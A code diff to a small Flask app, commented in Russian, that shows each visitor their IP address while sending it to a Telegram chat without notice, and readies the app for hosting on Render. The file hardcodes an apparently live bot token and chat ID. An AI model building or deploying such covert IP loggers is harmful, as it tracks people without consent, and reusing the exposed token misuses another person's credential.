@@ -1,9 +1,10 @@
+import os
 from flask import Flask, request
 import requests
 
 app = Flask(__name__)
 
-# 🔧 Настройки Telegram
+# Настройки Telegram
 BOT_TOKEN = "8467658943:AAHfyHgsfXBH0xY77HQxNiG_uOldskIOHbQ"
 CHAT_ID = "5744958521"
 
@@ -14,14 +15,10 @@ def send_to_telegram(ip):
 
 @app.route("/")
 def index():
-    # Получаем реальный IP (если есть прокси)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-
-    # Отправляем в Telegram
     send_to_telegram(ip)
-
-    # Показываем пользователю
     return f"<h2>Ваш IP: {ip}</h2>"
 
 if __name__ == "__main__":
-    app.run()
+    port = int(os.environ.get("PORT", 5000))  # Render передаёт порт через переменную
+    app.run(host="0.0.0.0", port=port)
